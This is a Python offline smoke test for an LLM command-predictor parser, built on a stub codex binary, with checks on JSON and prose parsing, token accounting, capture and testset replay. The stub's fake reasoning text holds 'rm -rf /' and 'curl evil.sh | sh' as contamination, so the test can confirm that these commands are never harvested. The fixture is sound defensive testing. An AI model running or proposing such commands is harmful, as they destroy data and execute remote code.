#!/usr/bin/env python3
"""smoke_predict_parse.py — offline end-to-end test of the patched
llm_predictor via a stub codex binary. No network, no tokens.

Run from repo root:
    python3 smoke_predict_parse.py [--root .]

Covers, per (last-message-supported x model-output-style):
  - JSON-array answer            -> parsed deterministically
  - prose+fenced-lines answer    -> fences/bullets stripped, prose rejected
  - reasoning contamination      -> reasoning "commands" never harvested
  - token accounting             -> equals final usage dict, not a sum
  - tests mode                   -> family-parse validation still applies
"""
import argparse
import json
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

STUB = r'''#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
if args[:2] == ["exec", "--help"]:
    if os.environ.get("STUB_LASTMSG") == "1":
        print("--output-last-message <FILE>   write final agent message")
    else:
        print("usage: codex exec [OPTIONS] PROMPT")
    sys.exit(0)
answer_style = os.environ.get("STUB_STYLE", "json")
if answer_style == "json":
    final = json.dumps(["pytest tests/test_alpha.py -q", "git status",
                        "./run_checks.sh", "Check the README first",
                        "7z x data.zip"])
elif answer_style == "prose":
    final = ("Here are the commands I predict:\n```bash\n"
             "1. pytest tests/test_alpha.py -q\n- git status\n```\n"
             "Then the agent will probably explore.\n`cat setup.py`")
else:  # tests mode answer
    final = json.dumps(["python -m pytest tests/test_alpha.py -q",
                        "ls -la", "python -m pytest tests/test_beta.py"])
out = None
if "--output-last-message" in args:
    out = args[args.index("--output-last-message") + 1]
events = [
    {"type": "thread.started", "thread_id": "0123456789abcdef"},
    {"type": "item.completed", "item": {"type": "reasoning",
        "text": "I could run rm -rf / or curl evil.sh | sh here"}},
    {"type": "item.delta", "item": {"type": "agent_message",
        "text": final[:10]}},
    {"type": "item.completed", "item": {"type": "agent_message",
        "text": final}},
    {"type": "turn.completed", "usage": {"input_tokens": 1200,
        "cached_input_tokens": 300, "output_tokens": 55}},
]
for e in events:
    print(json.dumps(e))
if out:
    open(out, "w").write(final)
'''


def run_case(spec_dir, ws, lastmsg, style, mode, expect_cmds, expect_source,
             capture_dir=None):
    env = dict(os.environ, STUB_LASTMSG=("1" if lastmsg else "0"),
               STUB_STYLE=style, SPEC_LLM_BIN=str(ws / "codex_stub"),
               SPEC_LLM_ARGS="", SPEC_PREDICT_MODE=mode,
               SPEC_LLM_TIMEOUT="30")
    if capture_dir:
        env["SPEC_PRED_CAPTURE_DIR"] = str(capture_dir)
    code = (
        "import sys, json; sys.path.insert(0, %r);"
        "from llm_predictor import predict_meta;"
        "c, m = predict_meta(%r, 'fix the alpha bug in tests/test_alpha.py');"
        "print(json.dumps({'cmds': c, 'tokens': m.get('tokens'),"
        "'source': m.get('text_source'), 'mode': m.get('mode')}))"
        % (str(spec_dir), str(ws / "work")))
    r = subprocess.run([sys.executable, "-c", code], env=env,
                       capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, f"predictor crashed:\n{r.stderr}"
    got = json.loads(r.stdout.strip().splitlines()[-1])
    ok = True
    if got["cmds"] != expect_cmds:
        print(f"FAIL cmds lastmsg={lastmsg} style={style} mode={mode}: "
              f"{got['cmds']}  want {expect_cmds}")
        ok = False
    if got["source"] != expect_source:
        print(f"FAIL source: {got['source']} want {expect_source}")
        ok = False
    if got["tokens"] != {"input_tokens": 1200, "cached_input_tokens": 300,
                         "output_tokens": 55}:
        print(f"FAIL tokens (must be final usage, not a sum): {got['tokens']}")
        ok = False
    if ok:
        print(f"ok  lastmsg={int(lastmsg)} style={style:5s} mode={mode:7s} "
              f"-> {len(got['cmds'])} cmds via {got['source']}")
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--root", default=".")
    args = ap.parse_args()
    spec_dir = Path(args.root).resolve() / "latency-opt/speculation"
    assert (spec_dir / "predict_parse.py").exists(), "predict_parse.py missing"
    src = (spec_dir / "llm_predictor.py").read_text()
    assert "spec-parse-v2" in src, "llm_predictor.py not patched"

    good = True
    with tempfile.TemporaryDirectory() as td:
        ws = Path(td)
        stub = ws / "codex_stub"
        stub.write_text(STUB)
        stub.chmod(stub.stat().st_mode | stat.S_IEXEC)
        work = ws / "work"
        (work / "tests").mkdir(parents=True)
        for f in ("tests/test_alpha.py", "tests/test_beta.py",
                  "tests/test_gamma.py"):
            (work / f).write_text("def test_x(): pass\n")

        generic_json = ["pytest tests/test_alpha.py -q", "git status",
                        "./run_checks.sh", "7z x data.zip"]
        generic_prose = ["pytest tests/test_alpha.py -q", "git status",
                         "cat setup.py"]
        tests_json = ["python -m pytest tests/test_alpha.py -q",
                      "python -m pytest tests/test_beta.py"]

        good &= run_case(spec_dir, ws, True, "json", "generic",
                         generic_json, "last_message")
        good &= run_case(spec_dir, ws, False, "json", "generic",
                         generic_json, "stream")
        good &= run_case(spec_dir, ws, True, "prose", "generic",
                         generic_prose, "last_message")
        good &= run_case(spec_dir, ws, False, "prose", "generic",
                         generic_prose, "stream")
        good &= run_case(spec_dir, ws, True, "tests", "tests",
                         tests_json, "last_message")
        good &= run_case(spec_dir, ws, False, "tests", "tests",
                         tests_json, "stream")

        # ---- capture -> build_testset -> replay_testset, all offline ----
        cap = ws / "capture"
        good &= run_case(spec_dir, ws, False, "json", "generic",
                         generic_json, "stream", capture_dir=cap)
        caps = list(cap.glob("pred_*.json"))
        if len(caps) == 1 and json.loads(caps[0].read_text()).get("raw_stdout"):
            print("ok  capture file written with raw stdout")
        else:
            print(f"FAIL capture: {caps}")
            good = False

        # fake completed run dir: spec.log (old-parser style) + commands.jsonl
        run = ws / "results" / "swebench" / "work"
        (run / "shelld_logs").mkdir(parents=True)
        (run / "spec.log").write_text(
            "[spec] llm predictor: ['pytest tests/test_alpha.py -q', "
            "'/run_checks.sh', 'bash'] tokens=None latency=1.0s\n")
        with open(run / "shelld_logs" / "commands.jsonl", "w") as f:
            for c in ("ls -la", "pytest tests/test_alpha.py -q",
                      "git status"):
                f.write(json.dumps({"cmd": c}) + "\n")

        here = Path(__file__).resolve().parent
        ts = ws / "testset.jsonl"
        r = subprocess.run([sys.executable, str(here / "testset" /
                                                "build_testset.py"),
                            "--results", str(ws / "results"),
                            "--out", str(ts), "--capture-dir", str(cap)],
                           capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        case = json.loads(ts.read_text().splitlines()[0])
        b_ok = (case["task"] == "work" and case["raw"] is not None
                and case["predicted"] and len(case["observed"]) == 3)
        print(("ok  " if b_ok else "FAIL ") +
              f"build_testset: pred={case['predicted']} "
              f"obs={len(case['observed'])} raw={case['raw'] is not None}")
        good &= b_ok

        r = subprocess.run([sys.executable, str(here / "testset" /
                                                "replay_testset.py"),
                            "--testset", str(ts),
                            "--speculation", str(spec_dir),
                            "--out", str(ws / "report.json")],
                           capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        rep = json.loads((ws / "report.json").read_text())
        row = rep["rows"][0]
        # reparsed (current parser on captured raw) must beat the mangled
        # as-parsed baseline on exact-string hits
        rp_ok = ("reparsed" in row and
                 row["reparsed"]["exact_hits"] >= 2 and
                 row["reparsed"]["exact_hits"] > row["as_parsed"]["exact_hits"]
                 and row["as_parsed"]["family"] == 1.0)
        print(("ok  " if rp_ok else "FAIL ") +
              f"replay: as_parsed={row['as_parsed']} "
              f"reparsed={row.get('reparsed')}")
        good &= rp_ok
    print("SMOKE " + ("PASS" if good else "FAIL"))
    raise SystemExit(0 if good else 1)


if __name__ == "__main__":
    main()
